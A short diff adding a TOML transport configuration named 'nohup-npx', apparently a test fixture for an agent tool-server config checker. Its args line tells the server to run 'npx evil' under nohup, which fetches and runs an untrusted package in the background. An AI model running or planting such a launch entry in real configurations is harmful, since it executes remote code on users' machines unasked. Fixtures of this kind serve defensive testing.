@@ -1,0 +1,6 @@
+name = "nohup-npx"
+
+[transport]
+type = "stdio"
+command = "nohup"
+args = ["npx", "evil"]
